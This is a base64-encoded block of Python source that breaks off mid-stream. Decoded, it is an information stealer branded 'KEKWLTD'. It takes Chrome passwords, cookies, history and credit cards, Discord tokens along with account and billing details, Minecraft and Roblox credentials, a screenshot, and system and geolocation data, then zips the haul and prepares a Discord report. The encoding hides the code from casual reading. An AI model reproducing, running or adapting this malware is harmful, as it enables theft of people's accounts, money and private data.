0X3RyeQogICAgZGVmIHN0ZWFsX3Bhc3N3b3JkcyhzZWxmKToKICAgICAgICBmID0gb3BlbihudHBhdGguam9pbihzZWxmLmRpciwgJ0dvb2dsZScsICdQYXNzd29yZHMudHh0JyksICd3JywgZW5jb2Rpbmc9ImNwNDM3IiwgZXJyb3JzPSdpZ25vcmUnKQogICAgICAgIGZvciBwcm9mIGluIG9zLmxpc3RkaXIoc2VsZi5jaHJtbXVzZXJkdHQpOgogICAgICAgICAgICBpZiByZS5tYXRjaChzZWxmLmNocm1yZ3gsIHByb2YpOgogICAgICAgICAgICAgICAgbG9naW5fZGIgPSBudHBhdGguam9pbihzZWxmLmNocm1tdXNlcmR0dCwgcHJvZiwgJ0xvZ2luIERhdGEnKQogICAgICAgICAgICAgICAgbG9naW4gPSBzZWxmLmNyMzR0M19mMWxrZXMoKQoKICAgICAgICAgICAgICAgIHNodXRpbC5jb3B5Mihsb2dpbl9kYiwgbG9naW4pCiAgICAgICAgICAgICAgICBjb25uID0gc3FsaXRlMy5jb25uZWN0KGxvZ2luKQogICAgICAgICAgICAgICAgY3Vyc29yID0gY29ubi5jdXJzb3IoKQogICAgICAgICAgICAgICAgY3Vyc29yLmV4ZWN1dGUoIlNFTEVDVCBhY3Rpb25fdXJsLCB1c2VybmFtZV92YWx1ZSwgcGFzc3dvcmRfdmFsdWUgRlJPTSBsb2dpbnMiKQoKICAgICAgICAgICAgICAgIGZvciByIGluIGN1cnNvci5mZXRjaGFsbCgpOgogICAgICAgICAgICAgICAgICAgIHVybCA9IHJbMF0KICAgICAgICAgICAgICAgICAgICB1c2VybmFtZSA9IHJbMV0KICAgICAgICAgICAgICAgICAgICBlbmNyeXB0ZWRfcGFzc3dvcmQgPSByWzJdCiAgICAgICAgICAgICAgICAgICAgZGVjcnlwdGVkX3Bhc3N3b3JkID0gc2VsZi5kY3JwdF92YWwoZW5jcnlwdGVkX3Bhc3N3b3JkLCBzZWxmLmNocm9tZV9rZXkpCiAgICAgICAgICAgICAgICAgICAgaWYgdXJsICE9ICIiOgogICAgICAgICAgICAgICAgICAgICAgICBmLndyaXRlKGYiVVJMOiB7dXJsfVxuSUQ6IHt1c2VybmFtZX1cblBBU1NXMFJEOiB7ZGVjcnlwdGVkX3Bhc3N3b3JkfVxuXG4iKQoKICAgICAgICAgICAgICAgIGN1cnNvci5jbG9zZSgpCiAgICAgICAgICAgICAgICBjb25uLmNsb3NlKCkKICAgICAgICAgICAgICAgIG9zLnJlbW92ZShsb2dpbikKICAgICAgICBmLmNsb3NlKCkKCgoKICAgIEBleHRyYWN0X3RyeQogICAgZGVmIHN0ZWFsX2Nvb2tpZXMoc2VsZik6CiAgICAgICAgZiA9IG9wZW4obnRwYXRoLmpvaW4oc2VsZi5kaXIsICdHb29nbGUnLCAnQ29va2llcy50eHQnKSwgJ3cnLCBlbmNvZGluZz0iY3A0MzciLCBlcnJvcnM9J2lnbm9yZScpCiAgICAgICAgZm9yIHByb2YgaW4gb3MubGlzdGRpcihzZWxmLmNocm1tdXNlcmR0dCk6CgogICAgICAgICAgICBpZiByZS5tYXRjaChzZWxmLmNocm1yZ3gsIHByb2YpOgoKICAgICAgICAgICAgICAgIGxvZ2luX2RiID0gbnRwYXRoLmpvaW4oc2VsZi5jaHJtbXVzZXJkdHQsIHByb2YsICdOZXR3b3JrJywgJ2Nvb2tpZXMnKQogICAgICAgICAgICAgICAgbG9naW4gPSBzZWxmLmNyMzR0M19mMWxrZXMoKQoKCiAgICAgICAgICAgICAgICBzaHV0aWwuY29weTIobG9naW5fZGIsIGxvZ2luKQogICAgICAgICAgICAgICAgY29ubiA9IHNxbGl0ZTMuY29ubmVjdChsb2dpbikKICAgICAgICAgICAgICAgIGN1cnNvciA9IGNvbm4uY3Vyc29yKCkKICAgICAgICAgICAgICAgIGN1cnNvci5leGVjdXRlKCJTRUxFQ1QgaG9zdF9rZXksIG5hbWUsIGVuY3J5cHRlZF92YWx1ZSBmcm9tIGNvb2tpZXMiKQoKICAgICAgICAgICAgICAgIGZvciByIGluIGN1cnNvci5mZXRjaGFsbCgpOgogICAgICAgICAgICAgICAgICAgIGhvc3QgPSByWzBdCiAgICAgICAgICAgICAgICAgICAgdXNlciA9IHJbMV0KICAgICAgICAgICAgICAgICAgICBkZWNyeXB0ZWRfY29va2llID0gc2VsZi5kY3JwdF92YWwoclsyXSwgc2VsZi5jaHJvbWVfa2V5KQogICAgICAgICAgICAgICAgICAgIGlmIGhvc3QgIT0gIiI6CiAgICAgICAgICAgICAgICAgICAgICAgIGYud3JpdGUoZiJ7aG9zdH0JVFJVRSIrIgkJIisgZiIvRkFMU0UJMjU5NzU3MzQ1Ngl7dXNlcn0Je2RlY3J5cHRlZF9jb29raWV9XG4iKQogICAgICAgICAgICAgICAgICAgIGlmICdffFdBUk5JTkc6LURPLU5PVC1TSEFSRS1USElTLi0tU2hhcmluZy10aGlzLXdpbGwtYWxsb3ctc29tZW9uZS10by1sb2ctaW4tYXMteW91LWFuZC10by1zdGVhbC15b3VyLVJPQlVYLWFuZC1pdGVtcy58XycgaW4gZGVjcnlwdGVkX2Nvb2tpZToKICAgICAgICAgICAgICAgICAgICAgICAgc2VsZi5yb2Jsb3hjb29raWVzLmFwcGVuZChkZWNyeXB0ZWRfY29va2llKQoKICAgICAgICAgICAgICAgIGN1cnNvci5jbG9zZSgpCiAgICAgICAgICAgICAgICBjb25uLmNsb3NlKCkKICAgICAgICAgICAgICAgIG9zLnJlbW92ZShsb2dpbikKICAgICAgICBmLmNsb3NlKCkKCiAgICBkZWYgc3RlYWxfaGlzdG9yeTIoc2VsZiwgbmFtZTogc3RyLCBwYXRoOiBzdHIsIHByb2ZpbGU6IHN0cik6CiAgICAgICAgcGF0aCArPSAnXFwnICsgcHJvZmlsZSArICdcXEhpc3RvcnknCiAgICAgICAgaWYgbm90IG9zLnBhdGguaXNmaWxlKHBhdGgpOgogICAgICAgICAgICByZXR1cm4KICAgICAgICBoaXN0b3J5dmF1bHQgPSBzZWxmLnJhbmRvbV9kaXJfY3JlYXRlKCkKICAgICAgICBjb3B5MihwYXRoLCBoaXN0b3J5dmF1bHQpCiAgICAgICAgY29ubiA9IHNxbGl0ZTMuY29ubmVjdChoaXN0b3J5dmF1bHQpCiAgICAgICAgY3Vyc29yID0gY29ubi5jdXJzb3IoKQogICAgICAgIHdpdGggb3Blbihvcy5wYXRoLmpvaW4oc2VsZi5kaXIsICJCcm93c2VycyIsICJBbGwgSGlzdG9yeS50eHQiKSwgJ2EnLCBlbmNvZGluZz0idXRmLTgiKSBhcyBmOgogICAgICAgICAgICBzaXRlcyA9IFtdCiAgICAgICAgICAgIGZvciByZXMgaW4gY3Vyc29yLmV4ZWN1dGUoIlNFTEVDVCB1cmwsIHRpdGxlLCB2aXNpdF9jb3VudCwgbGFzdF92aXNpdF90aW1lIEZST00gdXJscyIpLmZldGNoYWxsKCk6CiAgICAgICAgICAgICAgICB1cmwsIHRpdGxlLCB2aXNpdF9jb3VudCwgbGFzdF92aXNpdF90aW1lID0gcmVzCiAgICAgICAgICAgICAgICBpZiB1cmwgYW5kIHRpdGxlIGFuZCB2aXNpdF9jb3VudCBhbmQgbGFzdF92aXNpdF90aW1lICE9ICIiOgogICAgICAgICAgICAgICAgICAgIHNpdGVzLmFwcGVuZCgodXJsLCB0aXRsZSwgdmlzaXRfY291bnQsIGxhc3RfdmlzaXRfdGltZSkpCiAgICAgICAgICAgIHNpdGVzLnNvcnQoa2V5PWxhbWJkYSB4OiB4WzNdLCByZXZlcnNlPVRydWUpCiAgICAgICAgICAgIGZvciBzaXRlIGluIHNpdGVzOgogICAgICAgICAgICAgICAgZi53cml0ZSgiVmlzaXQgQ291bnQ6IHs6PDZ9IFRpdGxlOiB7Ojw0MH1cbiIuZm9ybWF0KHNpdGVbMl0sIHNpdGVbMV0pKQogICAgICAgIGN1cnNvci5jbG9zZSgpCiAgICAgICAgY29ubi5jbG9zZSgpCiAgICAgICAgb3MucmVtb3ZlKGhpc3Rvcnl2YXVsdCkKCiAgICBkZWYgc3RlYWxfY2MyKHNlbGYsIG5hbWU6IHN0ciwgcGF0aDogc3RyLCBwcm9maWxlOiBzdHIpOgogICAgICAgIHBhdGggKz0gJ1xcJyArIHByb2ZpbGUgKyAnXFxXZWIgRGF0YScKICAgICAgICBpZiBub3Qgb3MucGF0aC5pc2ZpbGUocGF0aCk6CiAgICAgICAgICAgIHJldHVybgogICAgICAgIGNyZWRpdF9jYXJkX3ZhdWx0ID0gc2VsZi5yYW5kb21fZGlyX2NyZWF0ZSgpCiAgICAgICAgY29weTIocGF0aCwgY3JlZGl0X2NhcmRfdmF1bHQpCiAgICAgICAgY29ubiA9IHNxbGl0ZTMuY29ubmVjdChjcmVkaXRfY2FyZF92YXVsdCkKICAgICAgICBjdXJzb3IgPSBjb25uLmN1cnNvcigpCiAgICAgICAgd2l0aCBvcGVuKG9zLnBhdGguam9pbihzZWxmLmRpciwgIkJyb3dzZXJzIiwgIkFsbCBDcmVkaXRjYXJkcy50eHQiKSwgJ2EnLCBlbmNvZGluZz0idXRmLTgiKSBhcyBmOgogICAgICAgICAgICBmb3IgcmVzIGluIGN1cnNvci5leGVjdXRlKCJTRUxFQ1QgbmFtZV9vbl9jYXJkLCBleHBpcmF0aW9uX21vbnRoLCBleHBpcmF0aW9uX3llYXIsIGNhcmRfbnVtYmVyX2VuY3J5cHRlZCBGUk9NIGNyZWRpdF9jYXJkcyIpLmZldGNoYWxsKCk6CiAgICAgICAgICAgICAgICBuYW1lX29uX2NhcmQsIGV4cGlyYXRpb25fbW9udGgsIGV4cGlyYXRpb25feWVhciwgY2FyZF9udW1iZXJfZW5jcnlwdGVkID0gcmVzCiAgICAgICAgICAgICAgICBpZiBuYW1lX29uX2NhcmQgYW5kIGNhcmRfbnVtYmVyX2VuY3J5cHRlZCAhPSAiIjoKICAgICAgICAgICAgICAgICAgICBmLndyaXRlKAogICAgICAgICAgICAgICAgICAgICAgICBmIk5hbWU6IHtuYW1lX29uX2NhcmR9ICAgRXhwaXJhdGlvbiBNb250aDoge2V4cGlyYXRpb25fbW9udGh9ICAgRXhwaXJhdGlvbiBZZWFyOiB7ZXhwaXJhdGlvbl95ZWFyfSAgIENhcmQgTnVtYmVyOiB7c2VsZi5kY3JwdF92YWwoY2FyZF9udW1iZXJfZW5jcnlwdGVkLCBzZWxmLm1hc3RlcmtleSl9XG4iKQogICAgICAgIGYuY2xvc2UoKQogICAgICAgIGN1cnNvci5jbG9zZSgpCiAgICAgICAgY29ubi5jbG9zZSgpCiAgICAgICAgb3MucmVtb3ZlKGNyZWRpdF9jYXJkX3ZhdWx0KQoKCiAgICBAZXh0cmFjdF90cnkKICAgIGRlZiBzdGVhbF9oaXN0b3J5KHNlbGYpOgogICAgICAgIGYgPSBvcGVuKG50cGF0aC5qb2luKHNlbGYuZGlyLCAnR29vZ2xlJywgJ0hpc3RvcnkudHh0JyksICd3JywgZW5jb2Rpbmc9ImNwNDM3IiwgZXJyb3JzPSdpZ25vcmUnKQoKICAgICAgICBkZWYgeHRyYWN0d2JoaXN0KGRiX2N1cnNvcik6CiAgICAgICAgICAgIHdlYiA9ICIiCiAgICAgICAgICAgIGRiX2N1cnNvci5leGVjdXRlKCdTRUxFQ1QgdGl0bGUsIHVybCwgbGFzdF92aXNpdF90aW1lIEZST00gdXJscycpCiAgICAgICAgICAgIGZvciBpdGVtIGluIGRiX2N1cnNvci5mZXRjaGFsbCgpOgogICAgICAgICAgICAgICAgd2ViICs9IGYiU2VhcmNoIFRpdGxlOiB7aXRlbVswXX1cblVSTDoge2l0ZW1bMV19XG5MQVNUIFZJU0lUIFRJTUU6IHtzZWxmLmNudmVydHRpbShpdGVtWzJdKS5zdHJmdGltZSgnJVkvJW0vJWQgLSAlSDolTTolUycpfVxuXG4iCiAgICAgICAgICAgIHJldHVybiB3ZWIKCgogICAgICAgIGRlZiB4dHJhY3R3YnMzcmNoKGRiX2N1cnNvcik6CiAgICAgICAgICAgIGRiX2N1cnNvci5leGVjdXRlKCdTRUxFQ1QgdGVybSBGUk9NIGtleXdvcmRfc2VhcmNoX3Rlcm1zJykKICAgICAgICAgICAgc2VhcmNoX3Rlcm1zID0gIiIKCiAgICAgICAgICAgIGZvciBpdGVtIGluIGRiX2N1cnNvci5mZXRjaGFsbCgpOgogICAgICAgICAgICAgICAgaWYgaXRlbVswXSAhPSAiIjoKICAgICAgICAgICAgICAgICAgICBzZWFyY2hfdGVybXMgKz0gZiJ7aXRlbVswXX1cbiIKCiAgICAgICAgICAgIHJldHVybiBzZWFyY2hfdGVybXMKCgogICAgICAgIGZvciBwcm9mIGluIG9zLmxpc3RkaXIoc2VsZi5jaHJtbXVzZXJkdHQpOgoKICAgICAgICAgICAgaWYgcmUubWF0Y2goc2VsZi5jaHJtcmd4LCBwcm9mKToKCiAgICAgICAgICAgICAgICBsb2dpbl9kYiA9IG50cGF0aC5qb2luKHNlbGYuY2hybW11c2VyZHR0LCBwcm9mLCAnSGlzdG9yeScpCiAgICAgICAgICAgICAgICBsb2dpbiA9IHNlbGYuY3IzNHQzX2YxbGtlcygpCgogICAgICAgICAgICAgICAgc2h1dGlsLmNvcHkyKGxvZ2luX2RiLCBsb2dpbikKICAgICAgICAgICAgICAgIGNvbm4gPSBzcWxpdGUzLmNvbm5lY3QobG9naW4pCiAgICAgICAgICAgICAgICBjdXJzb3IgPSBjb25uLmN1cnNvcigpCgoKICAgICAgICAgICAgICAgIHNlYXJjaF9oaXN0b3J5ID0geHRyYWN0d2JzM3JjaChjdXJzb3IpCiAgICAgICAgICAgICAgICB3ZWJfaGlzdG9yeSA9IHh0cmFjdHdiaGlzdChjdXJzb3IpCgogICAgICAgICAgICAgICAgZi53cml0ZShmInsnICcqMTd9U0VBUkNIXG57Jy0nKjUwfVxue3NlYXJjaF9oaXN0b3J5fVxueycgJyoxN31cblxuTGlua3MgSGlzdG9yeVxueyctJyo1MH1cbnt3ZWJfaGlzdG9yeX0iKQoKICAgICAgICAgICAgICAgIGN1cnNvci5jbG9zZSgpCiAgICAgICAgICAgICAgICBjb25uLmNsb3NlKCkKICAgICAgICAgICAgICAgIG9zLnJlbW92ZShsb2dpbikKICAgICAgICBmLmNsb3NlKCkKCgogICAgZGVmIG5hdGlmeV9tYXRjaGVkX3Rva2VucyhzZWxmKToKCiAgICAgICAgZiA9IG9wZW4oc2VsZi5kaXIgKyAiXFxEaXNjb3JkX0luZm8udHh0IiwgInciLCBlbmNvZGluZz0iY3A0MzciLCBlcnJvcnM9J2lnbm9yZScpCgogICAgICAgIGZvciB0b2tlbiBpbiBzZWxmLnRva2VuczoKICAgICAgICAgICAgaiA9IGh0dHB4LmdldChzZWxmLmRzY2FwMSwgaGVhZGVycz1zZWxmLmczdF9IKHRva2VuKSkuanNvbigpCiAgICAgICAgICAgIHVzZXIgPSBqLmdldCgndXNlcm5hbWUnKSArICcjJyArIHN0cihqLmdldCgiZGlzY3JpbWluYXRvciIpKQoKICAgICAgICAgICAgYmFkZ2VzID0gIiIKICAgICAgICAgICAgZmxhZ3MgPSBqWydmbGFncyddCiAgICAgICAgICAgIGlmIChmbGFncyA9PSAxKToKICAgICAgICAgICAgICAgIGJhZGdlcyArPSAiU3RhZmYsICIKICAgICAgICAgICAgaWYgKGZsYWdzID09IDIpOgogICAgICAgICAgICAgICAgYmFkZ2VzICs9ICJQYXJ0bmVyLCAiCiAgICAgICAgICAgIGlmIChmbGFncyA9PSA0KToKICAgICAgICAgICAgICAgIGJhZGdlcyArPSAiSHlwZXNxdWFkIEV2ZW50LCAiCiAgICAgICAgICAgIGlmIChmbGFncyA9PSA4KToKICAgICAgICAgICAgICAgIGJhZGdlcyArPSAiR3JlZW4gQnVnaHVudGVyLCAiCiAgICAgICAgICAgIGlmIChmbGFncyA9PSA2NCk6CiAgICAgICAgICAgICAgICBiYWRnZXMgKz0gIkh5cGVzcXVhZCBCcmF2ZXJ5LCAiCiAgICAgICAgICAgIGlmIChmbGFncyA9PSAxMjgpOgogICAgICAgICAgICAgICAgYmFkZ2VzICs9ICJIeXBlU3F1YWQgQnJpbGxhbmNlLCAiCiAgICAgICAgICAgIGlmIChmbGFncyA9PSAyNTYpOgogICAgICAgICAgICAgICAgYmFkZ2VzICs9ICJIeXBlU3F1YWQgQmFsYW5jZSwgIgogICAgICAgICAgICBpZiAoZmxhZ3MgPT0gNTEyKToKICAgICAgICAgICAgICAgIGJhZGdlcyArPSAiRWFybHkgU3VwcG9ydGVyLCAiCiAgICAgICAgICAgIGlmIChmbGFncyA9PSAxNjM4NCk6CiAgICAgICAgICAgICAgICBiYWRnZXMgKz0gIkdvbGQgQnVnSHVudGVyLCAiCiAgICAgICAgICAgIGlmIChmbGFncyA9PSAxMzEwNzIpOgogICAgICAgICAgICAgICAgYmFkZ2VzICs9ICJWZXJpZmllZCBCb3QgRGV2ZWxvcGVyLCAiCiAgICAgICAgICAgIGlmIChmbGFncyA9PSA0MTk0MzA0KToKICAgICAgICAgICAgICAgIGJhZGdlcyArPSAiQWN0aXZlIERldmVsb3BlciwgIgogICAgICAgICAgICBpZiAoYmFkZ2VzID09ICIiKToKICAgICAgICAgICAgICAgIGJhZGdlcyA9ICJOb25lIgoKICAgICAgICAgICAgZW1haWwgPSBqLmdldCgiZW1haWwiKQogICAgICAgICAgICBwaG9uZSA9IGouZ2V0KCJwaG9uZSIpIGlmIGouZ2V0KCJwaG9uZSIpIGVsc2UgIk5vIFBob25lIE51bWJlciBhdHRhY2hlZCIKICAgICAgICAgICAgbml0cm9fZGF0YSA9IGh0dHB4LmdldChzZWxmLmRzY2FwMSArICcvYmlsbGluZy9zdWJzY3JpcHRpb25zJywgaGVhZGVycz1zZWxmLmczdF9IKHRva2VuKSkuanNvbigpCiAgICAgICAgICAgIGhhc19uaXRybyA9IEZhbHNlCiAgICAgICAgICAgIGhhc19uaXRybyA9IGJvb2wobGVuKG5pdHJvX2RhdGEpID4gMCkKICAgICAgICAgICAgYmlsbGluZyA9IGJvb2wobGVuKGpzb24ubG9hZHMoaHR0cHguZ2V0KHNlbGYuZHNjYXAxICsgIi9iaWxsaW5nL3BheW1lbnQtc291cmNlcyIsIGhlYWRlcnM9c2VsZi5nM3RfSCh0b2tlbikpLnRleHQpKSA+IDApCgoKICAgICAgICAgICAgZi53cml0ZShmInsnICcqMTd9e3VzZXJ9XG57Jy0nKjUwfVxuQmlsbGluZz86IHtiaWxsaW5nfVxuTml0cm86IHtoYXNfbml0cm99XG5CYWRnZXM6IHtiYWRnZXN9XG5QaG9uZToge3Bob25lfVxuVG9rZW46IHt0b2tlbn1cbkVtYWlsOiB7ZW1haWx9XG5cbiIpCiAgICAgICAgZi5jbG9zZSgpCgoKICAgIGRlZiBncmFiYl9tYyhzZWxmKToKICAgICAgICBtaW5lY3JhZnRwYXRoID0gbnRwYXRoLmpvaW4oc2VsZi5kaXIsICdNaW5lY3JhZnQnKQogICAgICAgIG9zLm1ha2VkaXJzKG1pbmVjcmFmdHBhdGgsIGV4aXN0X29rPVRydWUpCiAgICAgICAgbWMgPSBudHBhdGguam9pbihzZWxmLnJvYW1pbmcsICcubWluZWNyYWZ0JykKCgogICAgICAgIHRncmIgPSBbJ2xhdW5jaGVyX2FjY291bnRzLmpzb24nLCAnbGF1bmNoZXJfcHJvZmlsZXMuanNvbicsICd1c2VyY2FjaGUuanNvbicsICdsYXVuY2hlcl9sb2cudHh0J10KCgogICAgICAgIGZvciBfZmlsZSBpbiB0Z3JiOgogICAgICAgICAgICBpZiBudHBhdGguZXhpc3RzKG50cGF0aC5qb2luKG1jLCBfZmlsZSkpOgogICAgICAgICAgICAgICAgc2h1dGlsLmNvcHkyKG50cGF0aC5qb2luKG1jLCBfZmlsZSksIG1pbmVjcmFmdHBhdGggKyBzZWxmLnNlcCArIF9maWxlKQoKICAgICAgICAgICAgICAgIAoKICAgIGRlZiBncmFiYl9yb2Jsb3goc2VsZik6CiAgICAgICAgZGVmIHN1YnByb2MocGF0aCk6CiAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgIHJldHVybiBzdWJwcm9jZXNzLmNoZWNrX291dHB1dCgKICAgICAgICAgICAgICAgICAgICBmciJwb3dlcnNoZWxsIEdldC1JdGVtUHJvcGVydHlWYWx1ZSAtUGF0aCB7cGF0aH06U09GVFdBUkVcUm9ibG94XFJvYmxveFN0dWRpb0Jyb3dzZXJccm9ibG94LmNvbSAtTmFtZSAuUk9CTE9TRUNVUklUWSIsCiAgICAgICAgICAgICAgICAgICAgY3JlYXRpb25mbGFncz0weDA4MDAwMDAwKS5kZWNvZGUoKS5yc3RyaXAoKQogICAgICAgICAgICBleGNlcHQgRXhjZXB0aW9uOgogICAgICAgICAgICAgICAgcmV0dXJuIE5vbmUKICAgICAgICByZWdfY29va2llID0gc3VicHJvYyhyJ0hLTE0nKQogICAgICAgIGlmIG5vdCByZWdfY29va2llOgogICAgICAgICAgICByZWdfY29va2llID0gc3VicHJvYyhyJ0hLQ1UnKQogICAgICAgIGlmIHJlZ19jb29raWU6CiAgICAgICAgICAgIHNlbGYucm9ibG94Y29va2llcy5hcHBlbmQocmVnX2Nvb2tpZSkKICAgICAgICBpZiBzZWxmLnJvYmxveGNvb2tpZXM6CiAgICAgICAgICAgIHdpdGggb3BlbihzZWxmLmRpciArICJcXFJvYmxveF9Db29raWVzLnR4dCIsICJ3IikgYXMgZjoKICAgICAgICAgICAgICAgIGZvciBpIGluIHNlbGYucm9ibG94Y29va2llczoKICAgICAgICAgICAgICAgICAgICBmLndyaXRlKGkgKyAnXG4nKQoKICAgIGRlZiBzdGVhbF9zY3JlZW4oc2VsZik6CiAgICAgICAgaW1hZ2UgPSBJbWFnZUdyYWIuZ3JhYigKICAgICAgICAgICAgYmJveD1Ob25lLAogICAgICAgICAgICBpbmNsdWRlX2xheWVyZWRfd2luZG93cz1GYWxzZSwKICAgICAgICAgICAgYWxsX3NjcmVlbnM9VHJ1ZSwKICAgICAgICAgICAgeGRpc3BsYXk9Tm9uZQogICAgICAgICkKICAgICAgICBpbWFnZS5zYXZlKHNlbGYuZGlyICsgIlxcU2NyZWVuc2hvdC5wbmciKQogICAgICAgIGltYWdlLmNsb3NlKCkKCiAgICBkZWYgc3lzdGVtX2luZm9ybWF0aW9ucyhzZWxmKToKICAgICAgICBhYm91dCA9IGYiIiIKe2luZm9jb219IHwge3ZjdG1fcGN9CldpbmRvd3Mga2V5OiB7c2VsZi53MW5rMzN5fQpXaW5kb3dzIHZlcnNpb246IHtzZWxmLncxbnYzcn0KUkFNOiB7cjRtfUdCCkRJU0s6IHtkMXNrfUdCCkhXSUQ6IHtzZWxmLnV1aWR3bmR6fQpJUDoge3NlbGYuaXB9CkNpdHk6IHtzZWxmLmNpdHl9CkNvdW50cnk6IHtzZWxmLmNvdW50cnl9ClJlZ2lvbjoge3NlbGYucmVnaW9ufQpPcmc6IHtzZWxmLm9yZ30KR29vZ2xlTWFwczoge3NlbGYuZ29vZ2xlbWFwfQogICAgICAgICIiIgogICAgICAgIHdpdGggb3BlbihzZWxmLmRpciArICJcXFN5c3RlbV9JbmZvLnR4dCIsICJ3IiwgZW5jb2Rpbmc9InV0Zi04IiwgZXJyb3JzPSdpZ25vcmUnKSBhcyBmOgogICAgICAgICAgICBmLndyaXRlKGFib3V0KQoKCgoKCgoKICAgIGRlZiBmaW5pc2hlZF9iYyhzZWxmKToKICAgICAgICBmb3IgaSBpbiBvcy5saXN0ZGlyKHNlbGYuZGlyKToKICAgICAgICAgICAgaWYgaS5lbmRzd2l0aCgnLnR4dCcpOgogICAgICAgICAgICAgICAgcGF0aCA9IHNlbGYuZGlyICsgc2VsZi5zZXAgKyBpCiAgICAgICAgICAgICAgICB3aXRoIG9wZW4ocGF0aCwgInIiLCBlcnJvcnM9Imlnbm9yZSIpIGFzIGZmOgogICAgICAgICAgICAgICAgICAgIHggPSBmZi5yZWFkKCkKICAgICAgICAgICAgICAgICAgICBpZiBub3QgeDoKICAgICAgICAgICAgICAgICAgICAgICAgZmYuY2xvc2UoKQogICAgICAgICAgICAgICAgICAgICAgICBvcy5yZW1vdmUocGF0aCkKICAgICAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgICAgICB3aXRoIG9wZW4ocGF0aCwgInciLCBlbmNvZGluZz0idXRmLTgiLCBlcnJvcnM9Imlnbm9yZSIpIGFzIGY6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBmLndyaXRlKCJLRUtXTFREIHwgaHR0cHM6Ly9rZWt3bHRkLnJ1XG5cbiIpCiAgICAgICAgICAgICAgICAgICAgICAgIHdpdGggb3BlbihwYXRoLCAiYSIsIGVuY29kaW5nPSJ1dGYtOCIsIGVycm9ycz0iaWdub3JlIikgYXMgZnA6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBmcC53cml0ZSh4ICsgIlxuXG5LRUtXTFREIHwgaHR0cHM6Ly9rZWt3bHRkLnJ1IikKCiAgICAgICAgX3ppcGZpbGUgPSBudHBhdGguam9pbihzZWxmLmFwcGRhdGEsIGYnQkMtW3tpbmZvY29tfV0uemlwJykKICAgICAgICB6aXBwZWRfZmlsZSA9IHppcGZpbGUuWmlwRmlsZShfemlwZmlsZSwgInciLCB6aXBmaWxlLlpJUF9ERUZMQVRFRCkKICAgICAgICBhYnNfc3JjID0gbnRwYXRoLmFic3BhdGgoc2VsZi5kaXIpCiAgICAgICAgZm9yIGRpcm5hbWUsIF8sIGZpbGVzIGluIG9zLndhbGsoc2VsZi5kaXIpOgogICAgICAgICAgICBmb3IgZmlsZW5hbWUgaW4gZmlsZXM6CiAgICAgICAgICAgICAgICBhYnNuYW1lID0gbnRwYXRoLmFic3BhdGgobnRwYXRoLmpvaW4oZGlybmFtZSwgZmlsZW5hbWUpKQogICAgICAgICAgICAgICAgYXJjbmFtZSA9IGFic25hbWVbbGVuKGFic19zcmMpICsgMTpdCiAgICAgICAgICAgICAgICB6aXBwZWRfZmlsZS53cml0ZShhYnNuYW1lLCBhcmNuYW1lKQogICAgICAgIHppcHBlZF9maWxlLmNsb3NlKCkKCiAgICAgICAgZmlsZV9jb3VudCwgZmlsZXNfZm91bmQsIHRva2VucyA9IDAsICcnLCAnJwogICAgICAgIGZvciBfLCBfXywgZmlsZXMgaW4gb3Mud2FsayhzZWxmLmRpcik6CiAgICAgICAgICAgIGZvciBfZmlsZSBpbiBmaWxlczoKICAgICAgICAgICAgICAgIGZpbGVzX2ZvdW5kICs9IGYi44O7e19maWxlfVxuIgogICAgICAgICAgICAgICAgZmlsZV9jb3VudCArPSAxCiAgICAgICAgZm9yIHRrbiBpbiBzZWxmLnRva2VuczoKICAgICAgICAgICAgdG9rZW5zICs9IGYne3Rrbn1cblxuJwogICAgICAgIGZpbGVDb3VudCA9IGYie2ZpbGVfY291bnR9IEZpbGVzIEZvdW5kOiAiCgogICAgICAgIGVtYmVkID0gewogICAgICAgICAgICAnbmFtZSc6ICJLRUtXTFREIiwKICAgICAgICAgICAgJ2F2YXRhcl91cmwnOiAnaHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXZhdGFycy8yMjg1NDkxMTM1ODE1MzUyMzUvNDMwZjgxZWFkNjdlYWZmY2FmZmJiNmU3YjBhZjI5MjcucG5nJywKICAgICAgICAgICAgJ2VtYmVkcyc6IFsKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAnYXV0aG9yJzogewogICAgICAgICAgICAgICAgICAgICAgICAnbmFtZSc6IGYnS0VLV0xURCB2Mi4zJywKICAgICAgICAgICAgICAgICAgICAgICAgJ3VybCc6ICdodHRwczovL2tla3dsdGQucnUnLAogICAgICAgICAgICAgICAgICAgICAgICAnaWNvbl91cmwnOiAnaHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXZhdGFycy8yMjg1NDkxMTM1ODE1MzUyMzUvNDMwZjgxZWFkNjdlYWZmY2FmZmJiNmU3YjBhZjI5MjcucG5nJwogICAgICAgICAgICAgICAgICAgIH0sCiAgICAgICAgICAgICAgICAgICAgJ2NvbG9yJzogMzc0Mjc2LAogICAgICAgICAgICAgICAgICAgICdkZXNjcmlwdGlvbic6IGYnW0tFS1dMVEQgaGFzIEdlbyBMb2NhbGlzZWQgdGhpcyBndXldKHtzZWxmLmdvb2dsZW1hcH0pJywKICAgICAgICAgICAgICAgICAgICAnZmllbGRzJzogWwogICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAnbmFtZSc6ICdcdTIwMGInLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJ3ZhbHVlJzogZicnJ2BgYGZpeAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIElQOiB7c2VsZi5pcC5yZXBsYWNlKCIgIiwgIiAiKSBpZiBzZWxmLmlwIGVsc2UgIk4vQSJ9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgT3JnOiB7c2VsZi5vcmcucmVwbGFjZSgiICIsICIgIikgaWYgc2VsZi5vcmcgZWxzZSAiTi9BIn0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBDaXR5OiB7c2VsZi5jaXR5LnJlcGxhY2UoIiAiLCAiICIpIGlmIHNlbGYuY2l0eSBlbHNlICJOL0EifQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFJlZ2lvbjoge3NlbGYucmVnaW9uLnJlcGxhY2UoIiAiLCAiICIpIGlmIHNlbGYucmVnaW9uIGVsc2UgIk4vQSJ9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgQ291bnRyeToge3NlbGYuY291bnRyeS5yZXBsYWNlKCIgIiwgIiAiKSBpZi